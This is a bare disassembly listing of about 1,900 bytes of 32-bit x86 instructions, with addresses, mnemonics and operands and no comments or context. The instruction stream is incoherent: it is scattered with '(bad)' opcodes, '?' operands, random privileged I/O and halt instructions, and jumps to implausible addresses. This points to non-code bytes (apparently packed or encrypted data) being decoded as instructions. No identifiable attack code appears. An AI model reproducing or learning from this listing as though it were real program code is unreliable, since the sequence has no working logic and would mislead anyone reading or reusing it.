  4087b8:	sbb    BYTE PTR [esi],bh
  4087ba:	and    DWORD PTR [edx-0x57e00bd9],ebp
  4087c0:	in     eax,0xaf
  4087c2:	dec    eax
  4087c3:	cmp    bh,BYTE PTR [edx-0x77]
  4087c6:	(bad)  
  4087c7:	sbb    BYTE PTR [eax],bh
  4087c9:	jmp    0x748728f1
  4087ce:	movsx  edx,WORD PTR [ecx+0x6a549df0]
  4087d5:	mov    al,ds:0xf17a695f
  4087da:	xchg   ebx,eax
  4087db:	sub    DWORD PTR [edi],ebx
  4087dd:	xor    al,0x4c
  4087df:	push   eax
  4087e0:	rcr    esi,0x11
  4087e3:	in     eax,0x3c
  4087e5:	xor    eax,0xd28ef94f
  4087ea:	daa    
  4087eb:	mov    ds:0x9af7977a,al
  4087f0:	ja     0x4087a7
  4087f2:	je     0x4087c1
  4087f4:	mov    cl,bh
  4087f6:	add    ecx,0xffffffe6
  4087f9:	dec    edi
  4087fa:	or     esi,DWORD PTR [edi+0x30200e0f]
  408800:	mov    ecx,0x521e78
  408805:	mov    edi,0x11bad0ee
  40880a:	sbb    edi,ebp
  40880c:	jecxz  0x4087aa
  40880e:	mov    cl,0xf8
  408810:	sar    BYTE PTR [eax],cl
  408812:	in     eax,0xca
  408814:	jne    0x408807
  408816:	bound  esi,QWORD PTR [esi-0x46322228]
  40881c:	sub    WORD PTR [ecx],di
  40881f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408820:	mov    edi,DWORD PTR [eax-0x26]
  408823:	das    
  408824:	xlat   BYTE PTR ds:[ebx]
  408825:	xlat   BYTE PTR ds:[ebx]
  408826:	jne    0x2e4d18f7
  40882c:	popa   
  40882d:	pop    edi
  40882e:	mov    eax,0xf3730d24
  408833:	cmp    al,0x35
  408836:	dec    ecx
  408837:	push   edx
  408838:	imul   esi,DWORD PTR [eax-0x4ce778e],0x4a66bec
  408842:	cmp    dh,BYTE PTR [edx]
  408844:	sbb    eax,0xeaa3acb2
  408849:	shl    DWORD PTR ds:0xd7e96269,1
  40884f:	or     eax,0x97e0aadc
  408854:	hlt    
  408855:	jge    0x408880
  408857:	scas   al,BYTE PTR es:[edi]
  408858:	inc    edx
  408859:	repnz dec esi
  40885b:	mov    edi,0x10e79aec
  408860:	cmp    eax,0x7df5fc07
  408865:	pop    ebp
  408866:	outs   dx,DWORD PTR ds:[esi]
  408867:	mov    dl,BYTE PTR [esi]
  408869:	pop    es
  40886a:	inc    eax
  40886b:	lods   eax,DWORD PTR ds:[esi]
  40886c:	dec    edi
  40886d:	mov    BYTE PTR [edi-0x7076a365],ah
  408873:	xchg   ecx,eax
  408874:	fwait
  408875:	jle    0x4087fd
  408877:	pop    ds
  408878:	mov    ebx,edx
  40887a:	ins    DWORD PTR es:[edi],dx
  40887b:	sub    BYTE PTR [esi+0x6ca15b5f],cl
  408881:	dec    esi
  408882:	dec    edx
  408883:	sti    
  408884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408885:	fistp  DWORD PTR [eax-0xe]
  408888:	push   ebx
  408889:	sub    eax,0x144a0075
  40888e:	mov    WORD PTR [edi],?
  408890:	mov    dl,0x24
  408892:	inc    esp
  408893:	int    0xb6
  408895:	push   ebx
  408896:	mov    al,0x48
  408898:	retf   
  408899:	es std 
  40889b:	xor    DWORD PTR [edx-0x2386dcac],esi
  4088a1:	popf   
  4088a2:	pop    ebp
  4088a3:	bound  ebx,QWORD PTR [esi+0x0]
  4088a6:	call   0xb2ca049b
  4088ab:	out    dx,al
  4088ac:	xchg   BYTE PTR ds:0x8e16552d,dh
  4088b2:	push   edi
  4088b3:	xchg   esi,eax
  4088b4:	fimul  DWORD PTR [eax+0x1efae307]
  4088ba:	sub    BYTE PTR [ebx+0x37f5691a],ah
  4088c0:	and    DWORD PTR [edi],esi
  4088c2:	(bad)  
  4088c4:	popf   
  4088c5:	add    esp,DWORD PTR [ecx+0x5b8e7c98]
  4088cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088cc:	std    
  4088cd:	outs   dx,DWORD PTR ds:[esi]
  4088ce:	lods   eax,DWORD PTR ds:[esi]
  4088cf:	push   ecx
  4088d0:	jb     0x408917
  4088d2:	and    BYTE PTR [edx+0x14],ah
  4088d5:	pusha  
  4088d6:	sub    ah,BYTE PTR [ecx+0x2d469334]
  4088dc:	push   ebp
  4088dd:	clc    
  4088de:	sbb    esp,esp
  4088e0:	fcom   DWORD PTR [ebx+eax*4+0x44]
  4088e4:	xor    BYTE PTR [esi+ecx*1],cl
  4088e7:	jno    0x40886f
  4088e9:	test   eax,0x98f9d454
  4088ee:	add    BYTE PTR [edx+0x1737048c],cl
  4088f4:	jmp    0x4088d5
  4088f6:	mov    dh,0xa5
  4088f8:	shr    BYTE PTR [ecx+0x49],1
  4088fb:	push   0xfd9bd675
  408900:	out    dx,eax
  408901:	retf   0xe128
  408904:	(bad)  
  408905:	mov    bl,0x28
  408907:	pushf  
  408908:	mov    edi,0x57fe502c
  40890d:	test   al,0xc3
  40890f:	xor    DWORD PTR [ebx],ebx
  408911:	push   esp
  408912:	shl    edi,0x79
  408915:	loopne 0x4088a5
  408917:	lods   eax,DWORD PTR ds:[esi]
  408918:	ins    DWORD PTR es:[edi],dx
  408919:	xchg   esp,eax
  40891a:	jl     0x408910
  40891c:	sub    al,0x3a
  40891e:	popa   
  40891f:	ins    DWORD PTR es:[edi],dx
  408920:	leave  
  408921:	add    BYTE PTR [ebx+ebp*2],cl
  408924:	(bad)  
  408925:	inc    esp
  408926:	push   0x18
  408928:	aas    
  408929:	fistp  DWORD PTR [edx]
  40892b:	inc    ecx
  40892c:	push   ds
  40892d:	inc    esp
  40892e:	fistp  QWORD PTR [edx-0x3b]
  408931:	(bad)  
  408932:	xor    edx,DWORD PTR [edx-0x1c31eed3]
  408938:	push   0xd88c17dc
  40893d:	shl    DWORD PTR [ecx-0x2ec8131a],1
  408943:	test   al,0x7e
  408945:	leave  
  408946:	cmp    al,ah
  408948:	sub    eax,0x4560caaf
  40894d:	mov    dh,0xaf
  40894f:	hlt    
  408950:	and    ecx,esi
  408952:	hlt    
  408953:	test   dl,bh
  408955:	mov    ds:0xd8f1adfd,al
  40895a:	mov    ecx,DWORD PTR ds:[ebx+0x3cd0f220]
  408961:	leave  
  408962:	lods   al,BYTE PTR ds:[esi]
  408963:	xor    edi,DWORD PTR [eax+0x3249ac67]
  408969:	mov    DWORD PTR [ebp-0x104367ad],esp
  40896f:	cmp    al,0x78
  408971:	dec    esi
  408972:	jge    0x40898c
  408974:	adc    al,0x1f
  408976:	jmp    0xeda1e779
  40897b:	jle    0x408982
  40897d:	and    eax,0xe96743b
  408982:	xchg   BYTE PTR [esi+0x51583706],dh
  408988:	xor    DWORD PTR [ebx-0x4ee465c8],0x50
  40898f:	mov    esi,es
  408991:	mov    WORD PTR [edx-0x63],cs
  408994:	mov    ds:0x1e805a95,eax
  408999:	sub    eax,0xefd0bd97
  40899e:	dec    ebp
  40899f:	in     eax,0xd1
  4089a1:	aam    0xa9
  4089a3:	or     BYTE PTR [edx+0x54e46a21],cl
  4089a9:	sub    DWORD PTR [ecx],0xf29273a8
  4089af:	xor    cl,BYTE PTR [edi-0x1905b091]
  4089b5:	ret    0xad06
  4089b8:	out    0x8c,eax
  4089ba:	push   eax
  4089bb:	and    bl,ch
  4089bd:	mov    edx,0x91485250
  4089c2:	test   eax,0x5f02ecd
  4089c7:	and    BYTE PTR [esi+0x5901e61],dh
  4089cd:	lea    ecx,[esp+ebx*4-0x66]
  4089d1:	rcr    DWORD PTR [eax-0x33],cl
  4089d4:	or     al,BYTE PTR [ebp+0x13f02ac8]
  4089da:	mov    edi,0xd401af3c
  4089df:	jno    0x4089c7
  4089e1:	or     DWORD PTR [esi+0x6d323f4d],ebx
  4089e7:	(bad)  
  4089e8:	sti    
  4089e9:	mov    cl,0x55
  4089eb:	test   eax,0x14a4f28d
  4089f0:	dec    edx
  4089f1:	loopne 0x4089ae
  4089f3:	mov    al,0xf9
  4089f5:	dec    edx
  4089f6:	aaa    
  4089f7:	ret    
  4089f8:	jmp    0xf041:0x123380a8
  4089ff:	iret   
  408a00:	sub    al,0xad
  408a02:	push   edi
  408a03:	xchg   BYTE PTR [ecx-0x5a],al
  408a06:	pusha  
  408a07:	inc    eax
  408a08:	int3   
  408a09:	aas    
  408a0a:	xchg   ebp,eax
  408a0b:	out    dx,eax
  408a0c:	or     DWORD PTR [ecx],ecx
  408a0e:	test   ecx,ebx
  408a10:	and    edi,edi
  408a12:	enter  0xc260,0x40
  408a16:	test   al,0xc7
  408a18:	dec    ebp
  408a19:	fstp   st(7)
  408a1b:	adc    edi,DWORD PTR [edx]
  408a1d:	cmp    ecx,DWORD PTR [esi+0x27]
  408a20:	adc    edx,DWORD PTR [edx+0x29f19094]
  408a26:	push   cs
  408a27:	or     esi,eax
  408a29:	jae    0x408a61
  408a2b:	aas    
  408a2c:	arpl   dx,ax
  408a2e:	ficom  DWORD PTR [ebx+0x6d]
  408a31:	xchg   ebx,eax
  408a32:	inc    ebx
  408a33:	dec    esi
  408a34:	xor    DWORD PTR ds:0xe4fc177c,esp
  408a3a:	inc    esi
  408a3b:	loop   0x4089c7
  408a3d:	fsub   st,st(4)
  408a3f:	mov    edx,0x145e2801
  408a44:	rcl    dl,1
  408a46:	inc    eax
  408a47:	sti    
  408a48:	push   esi
  408a49:	push   ebx
  408a4a:	or     eax,0x2c27a581
  408a4f:	mov    ?,ebp
  408a51:	xor    DWORD PTR [ebx],edx
  408a53:	xchg   ebp,eax
  408a54:	push   edx
  408a55:	fisub  DWORD PTR [edx]
  408a57:	jnp    0x4089df
  408a59:	xchg   esi,eax
  408a5a:	scas   eax,DWORD PTR es:[edi]
  408a5b:	xchg   ecx,eax
  408a5c:	repnz mov edx,0x1f2077ea
  408a62:	pop    edi
  408a63:	daa    
  408a64:	jnp    0x4089ee
  408a66:	ds jnp 0x4089f1
  408a69:	repnz lea ebp,[edx+0x44]
  408a6d:	ja     0x408ae6
  408a6f:	xor    edx,DWORD PTR [esi-0x7b]
  408a72:	mov    ebp,ebx
  408a74:	push   es
  408a75:	ds dec ebp
  408a77:	or     dl,BYTE PTR [edx-0xc28d365]
  408a7d:	mov    esi,0x3235b481
  408a82:	arpl   WORD PTR [ecx-0x6c],bx
  408a85:	inc    esp
  408a86:	push   ecx
  408a87:	in     eax,dx
  408a88:	pop    edi
  408a89:	rcl    edx,cl
  408a8b:	and    al,BYTE PTR [esi+0x815aa30]
  408a91:	pop    edx
  408a92:	fwait
  408a93:	fs rcr ah,cl
  408a96:	xor    DWORD PTR [esi],ecx
  408a98:	enter  0xe782,0xc9
  408a9c:	sub    ebx,DWORD PTR [ebx+0x4faf6cb]
  408aa2:	adc    BYTE PTR fs:[eax+ebp*4],bh
  408aa6:	leave  
  408aa7:	dec    eax
  408aa8:	int    0xf4
  408aaa:	ins    DWORD PTR es:[edi],dx
  408aab:	mov    eax,0xb3c94408
  408ab0:	or     eax,0xf886863f
  408ab5:	add    al,0x6e
  408ab7:	clc    
  408ab8:	popa   
  408ab9:	push   ds
  408aba:	loop   0x408a95
  408abc:	cmp    edx,DWORD PTR [ecx+0x4d]
  408abf:	cld    
  408ac0:	xor    ecx,DWORD PTR [esi-0x72e81d49]
  408ac6:	out    0x97,al
  408ac8:	and    bl,ch
  408aca:	les    esp,FWORD PTR [edx+0x52]
  408acd:	pop    ebp
  408ace:	leave  
  408acf:	adc    esp,DWORD PTR [ecx]
  408ad1:	imul   esi,DWORD PTR [ebx+0x7d],0xbda68ea0
  408ad8:	mov    eax,ds:0x7c058038
  408add:	retf   
  408ade:	ret    0x6010
  408ae1:	sub    al,0x46
  408ae3:	mov    esi,0x4fce3129
  408ae8:	gs in  al,dx
  408aea:	add    DWORD PTR fs:[edx-0x6f],edi
  408aee:	push   eax
  408aef:	push   edx
  408af0:	sub    al,0x98
  408af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af3:	mov    dh,0x64
  408af5:	mov    ebp,0x8c981bb6
  408afa:	aaa    
  408afb:	mov    cl,0x47
  408afd:	jb     0x408ad8
  408aff:	cs pop ebp
  408b01:	mov    dl,0x8
  408b03:	popf   
  408b04:	out    0xcc,eax
  408b06:	scas   eax,DWORD PTR es:[edi]
  408b07:	jge    0x408b6e
  408b09:	repnz or ebp,DWORD PTR [eax]
  408b0c:	xchg   DWORD PTR [ebp+0x1c684073],ecx
  408b12:	jns    0x408abc
  408b14:	sub    al,0x4a
  408b16:	shl    DWORD PTR [ecx+0x500f73de],1
  408b1c:	pop    esi
  408b1d:	outs   dx,DWORD PTR ds:[esi]
  408b1e:	dec    ebp
  408b1f:	fsubr  DWORD PTR [ebp+0x543155f0]
  408b25:	push   edx
  408b26:	mov    ebp,?
  408b28:	rol    DWORD PTR [edx+0x13],0x74
  408b2c:	mov    al,ds:0x6c7cb568
  408b31:	out    0xbc,eax
  408b33:	xchg   ebp,eax
  408b34:	push   esp
  408b35:	std    
  408b36:	fist   WORD PTR [esi]
  408b38:	int    0x23
  408b3a:	xchg   DWORD PTR [edi-0x3aeb4f5a],ecx
  408b40:	mov    edx,0xcfd62e34
  408b45:	es push ecx
  408b47:	mov    dl,0xbc
  408b49:	enter  0x9f8a,0x49
  408b4d:	retf   0xc657
  408b50:	retf   
  408b51:	sub    al,0x41
  408b53:	pushf  
  408b54:	in     al,dx
  408b55:	pop    esi
  408b56:	push   esi
  408b57:	stos   DWORD PTR es:[edi],eax
  408b58:	push   ebx
  408b59:	xchg   DWORD PTR [esp+eax*1+0x19],ecx
  408b5d:	out    0x32,al
  408b5f:	jecxz  0x408b86
  408b61:	sahf   
  408b62:	ror    BYTE PTR [edi],0x5e
  408b65:	shr    BYTE PTR [edx-0x5],0x4d
  408b69:	lock xchg BYTE PTR [ebx-0x7],cl
  408b6d:	addr16 in al,0xdd
  408b70:	adc    BYTE PTR [edi+0x1755a58f],dl
  408b76:	fdivrp st(6),st
  408b78:	jg     0x408bf3
  408b7a:	retf   
  408b7b:	int3   
  408b7c:	adc    eax,0xa65d2664
  408b81:	cmc    
  408b82:	jne    0x408bb2
  408b84:	lea    esp,[ebx-0x5b]
  408b87:	mov    esi,DWORD PTR [esi-0x6644cc00]
  408b8d:	mov    ss,WORD PTR [edx+edi*2]
  408b90:	xor    bl,0x3c
  408b93:	cmova  edi,edi
  408b96:	sub    DWORD PTR [ebx-0x588501f1],esp
  408b9c:	and    dl,BYTE PTR [ecx-0x2f75c4c0]
  408ba2:	syscall 
  408ba4:	jne    0x408b5d
  408ba6:	add    dh,BYTE PTR [esi-0x3d]
  408ba9:	enter  0xe39f,0x6a
  408bad:	push   0xffffffa5
  408baf:	inc    eax
  408bb0:	cmp    BYTE PTR [edx-0x6e41b73c],al
  408bb6:	dec    ebx
  408bb7:	dec    edi
  408bb8:	adc    ah,BYTE PTR ds:0xb3ec099e
  408bbe:	add    al,BYTE PTR [ecx+0x72a488d9]
  408bc4:	pop    eax
  408bc5:	icebp  
  408bc6:	jne    0x408b7b
  408bc8:	mov    DWORD PTR [ebp-0x2a8058cd],edx
  408bce:	or     esp,DWORD PTR [edi-0x78]
  408bd1:	repz jb 0x408c51
  408bd4:	xchg   ecx,eax
  408bd5:	neg    DWORD PTR [eax]
  408bd7:	jb     0x408b7f
  408bd9:	ins    BYTE PTR es:[edi],dx
  408bda:	cmp    DWORD PTR [esi],0x79
  408bdd:	out    0xd7,eax
  408bdf:	(bad)  
  408be0:	call   0xedef0856
  408be5:	outs   dx,BYTE PTR ds:[esi]
  408be6:	mov    eax,ds:0x5f48eb5e
  408beb:	dec    ebp
  408bec:	bound  esp,QWORD PTR [edx]
  408bee:	jl     0x408c15
  408bf0:	sahf   
  408bf1:	into   
  408bf2:	pop    esi
  408bf3:	int    0x5b
  408bf5:	jno    0x408b7a
  408bf7:	mov    al,0xc3
  408bf9:	adc    eax,0xcf31a684
  408bfe:	push   edi
  408bff:	(bad)  
  408c00:	out    dx,al
  408c01:	sub    BYTE PTR [ebx],ch
  408c03:	fs pop edi
  408c05:	rcr    DWORD PTR [eax-0x1a],0x1c
  408c09:	cwde   
  408c0a:	jmp    0xd761491
  408c0f:	inc    esp
  408c10:	and    esi,DWORD PTR [edi]
  408c12:	xlat   BYTE PTR ds:[ebx]
  408c13:	xor    ah,ah
  408c15:	jp     0x408c0c
  408c17:	mov    bh,0xc
  408c19:	jl     0x408c92
  408c1b:	out    0x38,al
  408c1d:	or     ch,al
  408c1f:	test   al,0xc5
  408c21:	sar    DWORD PTR [ebp-0x3b],cl
  408c24:	and    al,BYTE PTR [edi]
  408c26:	pop    es
  408c27:	mov    al,0xb8
  408c29:	fcom   QWORD PTR [ebp-0x17]
  408c2c:	(bad)  
  408c2d:	clc    
  408c2e:	mov    al,0x95
  408c30:	(bad)  
  408c31:	sbb    BYTE PTR [esi-0x24],bl
  408c34:	in     eax,0xf8
  408c36:	out    dx,eax
  408c37:	clc    
  408c38:	loopne 0x408bd3
  408c3a:	iret   
  408c3b:	dec    esp
  408c3c:	dec    edx
  408c3d:	pop    ecx
  408c3e:	inc    esi
  408c3f:	push   ds
  408c40:	pushf  
  408c41:	pop    eax
  408c42:	jno    0x408c70
  408c44:	enter  0x78dc,0x4f
  408c48:	cmp    eax,0x6771008a
  408c4d:	pop    eax
  408c4e:	imul   esp,edi,0xfffffff3
  408c51:	repz shr BYTE PTR [edx-0x730e4db5],cl
  408c58:	cmp    DWORD PTR [eax+0x295c2911],esp
  408c5e:	and    al,0x67
  408c60:	push   cs
  408c61:	adc    BYTE PTR [ebp-0x76],dl
  408c64:	mov    dl,0x87
  408c66:	jne    0x408c18
  408c68:	xlat   BYTE PTR ds:[ebx]
  408c6a:	test   eax,0x93d56f20
  408c6f:	push   0x1c
  408c71:	or     eax,0x46556534
  408c76:	addr16 adc al,0x9c
  408c79:	adc    eax,DWORD PTR [eax-0x41]
  408c7c:	nop
  408c7d:	push   ds
  408c7e:	iret   
  408c7f:	pop    es
  408c80:	(bad)  
  408c81:	cwde   
  408c82:	mov    DWORD PTR [eax+0x77b9c9b1],ebp
  408c88:	push   esp
  408c89:	sbb    esp,eax
  408c8b:	stc    
  408c8c:	imul   ebx,DWORD PTR [edx],0x8
  408c8f:	cmp    BYTE PTR [eax-0x6c],dh
  408c92:	mov    ebp,0xf858a346
  408c97:	xor    eax,0xf4c75107
  408c9c:	out    0x51,al
  408c9e:	rcr    DWORD PTR [edx-0x8d33c47],0xc8
  408ca5:	lock cmc 
  408ca7:	ror    BYTE PTR [ecx+edi*1+0x2b],cl
  408cab:	ins    BYTE PTR es:[edi],dx
  408cac:	inc    ebp
  408cad:	and    BYTE PTR [edx+eax*8+0x25379434],dl
  408cb4:	stc    
  408cb5:	fwait
  408cb6:	and    al,0x55
  408cb8:	mov    dh,0x7d
  408cba:	pusha  
  408cbb:	or     al,0x71
  408cbd:	fcomip st,st(1)
  408cbf:	push   ebx
  408cc0:	inc    ebp
  408cc1:	adc    eax,0x6cbfc50a
  408cc6:	out    0xca,al
  408cc8:	adc    al,0x56
  408cca:	lods   al,BYTE PTR ds:[esi]
  408ccb:	push   eax
  408ccc:	pop    ds
  408ccd:	sbb    edi,DWORD PTR [ebx-0x30]
  408cd0:	jmp    0x408c75
  408cd2:	jne    0x408d53
  408cd4:	sub    DWORD PTR [ebx-0x22eab9a1],ebx
  408cda:	add    BYTE PTR [esp+ecx*8-0x77],ch
  408cde:	jo     0x408c8e
  408ce0:	in     al,dx
  408ce1:	imul   eax,DWORD PTR [esi],0x25
  408ce4:	xor    ebp,esp
  408ce6:	cmp    ebp,ebx
  408ce8:	std    
  408ce9:	push   cs
  408cea:	push   ebx
  408ceb:	lock sbb al,0x7
  408cee:	fsubr  DWORD PTR [ecx]
  408cf0:	add    ah,BYTE PTR [edx+0x535a783b]
  408cf6:	push   ebp
  408cf7:	sbb    DWORD PTR [ecx],ebx
  408cf9:	hlt    
  408cfa:	loop   0x408cbb
  408cfc:	sub    ah,BYTE PTR [esi+0x5b]
  408cff:	in     eax,dx
  408d00:	push   eax
  408d01:	add    bh,cl
  408d03:	cli    
  408d04:	xchg   BYTE PTR [ebp+0x4b6e203e],dl
  408d0a:	mov    ebp,0x613dfb7f
  408d0f:	cmp    DWORD PTR [ecx],edi
  408d11:	sub    eax,0x2d5cecaa
  408d16:	mov    ebp,0xb66881ff
  408d1b:	xor    al,0xcd
  408d1d:	adc    cl,BYTE PTR [ecx-0x7249c948]
  408d23:	adc    ah,dh
  408d25:	pop    esi
  408d26:	push   edx
  408d27:	jnp    0x408ccb
  408d29:	jg     0x408cab
  408d2b:	push   0xffffffcc
  408d2d:	jnp    0x408d01
  408d2f:	sub    bl,cl
  408d31:	cmp    dl,bh
  408d33:	movq   mm7,QWORD PTR [edi-0x18]
  408d37:	lock dec ebx
  408d39:	sahf   
  408d3a:	dec    ebx
  408d3b:	mov    ds:0x29545ba8,al
  408d40:	sar    DWORD PTR [ecx+0x19a5e30f],1
  408d46:	dec    esi
  408d47:	xchg   esp,eax
  408d48:	call   0x67231745
  408d4d:	imul   edx,DWORD PTR [ecx],0x360b121b
  408d53:	mov    dl,0x22
  408d55:	imul   BYTE PTR [edi+0x37]
  408d58:	in     eax,0x42
  408d5a:	pop    ebp
  408d5b:	dec    edx
  408d5c:	sbb    eax,0xdb34a013
  408d61:	push   edi
  408d62:	outs   dx,BYTE PTR ds:[esi]
  408d63:	dec    eax
  408d64:	out    0x90,eax
  408d66:	popa   
  408d67:	pop    esp
  408d68:	xlat   BYTE PTR ds:[ebx]
  408d69:	or     DWORD PTR [edi+0x61ec4fab],0x48
  408d70:	pop    eax
  408d71:	mov    al,0xa0
  408d73:	cmp    DWORD PTR [ebp-0x51],ebp
  408d76:	fild   QWORD PTR [edx]
  408d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d79:	int    0xc4
  408d7b:	rol    bl,cl
  408d7d:	(bad)  
  408d7e:	retf   
  408d7f:	(bad)  
  408d80:	sub    al,0x89
  408d82:	repnz inc ebx
  408d84:	push   ebp
  408d85:	std    
  408d86:	vcmpsd xmm0,xmm4,QWORD PTR [edi-0x2fb253c0],0x22
  408d8f:	inc    edx
  408d90:	in     al,dx
  408d91:	pop    edi
  408d92:	jmp    0x408d57
  408d94:	inc    edi
  408d95:	cli    
  408d96:	sub    BYTE PTR [ecx+0x2e],0x1e
  408d9a:	test   esp,esi
  408d9c:	xor    al,0xca
  408d9e:	ins    BYTE PTR es:[edi],dx
  408d9f:	repz aaa 
  408da1:	push   ecx
  408da2:	jnp    0x408d4c
  408da4:	mov    bh,0x9b
  408da6:	jnp    0x408d69
  408da8:	jb     0x408e03
  408daa:	xor    BYTE PTR [esi],al
  408dac:	and    ch,BYTE PTR [edi-0x43]
  408daf:	lahf   
  408db0:	loop   0x408d37
  408db2:	sub    ecx,esi
  408db4:	cmp    al,0xb0
  408db6:	inc    esp
  408db7:	jle    0x408e26
  408db9:	inc    edx
  408dba:	hlt    
  408dbb:	pop    ss
  408dbc:	shr    BYTE PTR [eax-0x4313adb2],1
  408dc2:	mov    edx,0xdf7aeabf
  408dc7:	xlat   BYTE PTR ds:[ebx]
  408dc8:	pop    eax
  408dc9:	mov    eax,0xb86c31c8
  408dce:	es push 0xbba70403
  408dd4:	mov    ds:0x4e87f3c2,al
  408dd9:	pop    esp
  408dda:	out    0x8e,eax
  408ddc:	adc    al,0xa1
  408dde:	mov    eax,ds:0x7bb43fac
  408de3:	cld    
  408de4:	sar    BYTE PTR [edx],1
  408de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de7:	adc    BYTE PTR [ecx+0x7e],0xc0
  408deb:	push   ecx
  408dec:	imul   edi,DWORD PTR [eax],0x1170438d
  408df2:	xlat   BYTE PTR ds:[ebx]
  408df3:	pop    esi
  408df4:	sar    BYTE PTR [edx],1
  408df6:	pusha  
  408df7:	and    esi,DWORD PTR [ebx-0x265005d4]
  408dfd:	jle    0x408e52
  408dff:	fucomp st(6)
  408e01:	cld    
  408e02:	and    ebx,ebp
  408e04:	jecxz  0x408da3
  408e06:	int3   
  408e07:	push   es
  408e08:	inc    eax
  408e09:	imul   ebp,DWORD PTR [ebp+0x25170195],0xffffffee
  408e10:	push   ds
  408e11:	push   ds
  408e12:	inc    edx
  408e13:	daa    
  408e14:	lea    ebx,[esi+0x31]
  408e17:	dec    edi
  408e18:	loop   0x408e22
  408e1a:	shl    DWORD PTR [edx+0x57],0xb3
  408e1e:	shr    ah,0x2e
  408e21:	imul   eax,DWORD PTR [ebx-0x2],0xffffffc5
  408e25:	test   eax,0xb992d75c
  408e2a:	popa   
  408e2b:	xchg   ecx,eax
  408e2c:	(bad)  
  408e2d:	int    0xe3
  408e2f:	xchg   BYTE PTR [esp+ebp*8-0xbb5885f],ah
  408e36:	push   esi
  408e37:	or     al,dh
  408e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e3a:	ret    
  408e3b:	mov    WORD PTR [ecx+0x71],?
  408e3e:	push   ds
  408e3f:	sub    BYTE PTR [eax+0x0],ch
  408e42:	pop    esp
  408e43:	pop    ecx
  408e44:	sbb    DWORD PTR [ecx],ebp
  408e46:	xchg   ebp,eax
  408e47:	fld    st(1)
  408e49:	mov    eax,ds:0x675a3128
  408e4e:	rol    BYTE PTR [eax],1
  408e50:	aaa    
  408e51:	sbb    dl,dh
  408e53:	leave  
  408e54:	inc    eax
  408e55:	(bad)  
  408e56:	pop    ebx
  408e57:	(bad)  
  408e58:	lea    edx,[ebx-0x5a]
  408e5b:	push   es
  408e5c:	pop    edi
  408e5d:	add    ecx,DWORD PTR [ecx-0x71dd6e60]
  408e63:	push   es
  408e64:	pop    ss
  408e65:	gs cdq 
  408e67:	inc    edx
  408e68:	ret    
  408e69:	lea    ebp,[ecx-0x27c43583]
  408e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e70:	or     BYTE PTR [eax+0x629d4fc],al
  408e76:	call   DWORD PTR [ebx-0x453ae061]
  408e7c:	sbb    bl,BYTE PTR [bx+di+0x62]
  408e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e81:	mov    ds:0x69d73e6d,al
  408e86:	pusha  
  408e87:	mov    ebp,0xd738aedc
  408e8c:	mov    WORD PTR [ebx+eax*1],ss
  408e8f:	inc    ebp
  408e90:	jge    0x408e69
  408e92:	fwait
  408e93:	dec    esp
  408e94:	and    DWORD PTR [ecx-0x45],ebx
  408e97:	les    eax,FWORD PTR [esi-0x2d0888d2]
  408e9d:	mov    ah,0x39
  408e9f:	mov    BYTE PTR [ebp+ebx*8+0x14e7b3c0],0x9
  408ea7:	stos   DWORD PTR es:[edi],eax
  408ea8:	inc    ecx
  408ea9:	repnz scas eax,DWORD PTR es:[edi]
  408eab:	imul   esp,DWORD PTR [ecx],0x2
  408eae:	les    ecx,FWORD PTR [eax]
  408eb0:	push   ebx
  408eb1:	cmp    cl,BYTE PTR [edx-0x63f60e82]
  408eb7:	jmp    0xa6bdd21d
  408ebc:	or     ecx,DWORD PTR ds:0x11164e49
  408ec2:	pop    edi
  408ec3:	sbb    eax,0x6660be71
  408ec8:	fdivr  QWORD PTR [ebx+0x176b12a4]
  408ece:	out    dx,al
  408ecf:	int    0xd1
  408ed1:	imul   edi,DWORD PTR [ebp+0x7ef8ba3d],0x58
  408ed8:	test   DWORD PTR [edx],esi
  408eda:	mov    edi,0x347e273a
  408edf:	popw   es
  408ee1:	iret   
  408ee2:	clc    
  408ee3:	cli    
  408ee4:	push   esi
  408ee5:	or     esp,ecx
  408ee7:	aam    0x61
  408ee9:	ror    DWORD PTR [ecx+ecx*2],cl
  408eec:	xchg   esp,eax
  408eed:	sub    cl,BYTE PTR [esi]
  408eef:	div    BYTE PTR [ecx]
  408ef1:	adc    ch,ah
  408ef3:	add    BYTE PTR [edi+0x4d],ch
  408ef6:	and    al,0x8c
  408ef8:	cmp    al,0xf1
  408efa:	nop
  408efb:	jge    0x408eb4
  408efd:	mul    DWORD PTR [ecx-0x3e]
  408f00:	(bad)  
  408f01:	mov    al,0xe5
  408f03:	dec    BYTE PTR [ebx]
  408f05:	sub    al,0xe
  408f07:	nop/reserved BYTE PTR [esi+0x2458863e]
  408f0e:	in     al,0x7e
  408f10:	jns    0x408f2f
  408f12:	out    dx,al
  408f13:	lods   eax,DWORD PTR ds:[esi]
  408f14:	push   edx
  408f15:	xor    cl,ah
  408f17:	iret   
  408f18:	cmp    BYTE PTR [ebp+0x27],dl
  408f1b:	shl    DWORD PTR [edx+0x23ecef38],1
  408f21:	dec    esi
  408f22:	mov    bl,BYTE PTR [edx+edx*1+0x6c]
  408f26:	xor    ch,cl
  408f28:	inc    eax
  408f29:	repnz imul esp,DWORD PTR [esi],0x54
  408f2d:	or     eax,0xec99020a
  408f32:	ret    0xdc4
  408f35:	mov    cs,WORD PTR [ebp-0xe]
  408f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f39:	jnp    0x408ebf
  408f3b:	pusha  
  408f3c:	test   al,0x3b
  408f3e:	push   ecx
  408f3f:	push   edi
  408f40:	lea    edi,[ecx-0x27]
  408f43:	lds    edi,FWORD PTR [ebp+0x4670b3ec]
  408f49:	cmp    DWORD PTR [ebx-0x4ac09efb],edx
  408f4f:	(bad)  
  408f50:	loopne 0x408fa2
  408f52:	inc    ebp
  408f53:	int    0x25
  408f55:	jmp    0xb76a:0xb0b1e3d0
  408f5c:	fcmovnb st,st(0)
  408f5e:	sbb    ebx,0x5b
  408f61:	cmp    eax,0xd230f3a4
  408f66:	sub    bh,BYTE PTR [esi+0x52ccade1]
  408f6c:	and    edi,edi
